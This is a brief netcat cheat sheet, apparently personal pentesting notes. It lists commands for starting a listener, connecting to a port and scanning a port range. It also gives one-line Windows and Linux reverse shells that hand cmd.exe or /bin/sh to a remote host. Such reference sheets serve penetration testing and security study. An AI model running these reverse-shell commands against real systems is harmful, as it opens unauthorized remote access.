# start listener
nc -lvp <port>

# connect to given port using TCP, -v verbose, -n dont resolve
nc -nv <rhost> <rport>

# port scan, -z zero I/O mode, -w wait
nc -z -n -v -w1 <rhost> <rport>-<rport>

# Windows reverse shell
nc -nv <rhost> <rport> -e cmd.exe
# Linux reverse shell
nc -nv <rhost> <rport> -e /bin/sh
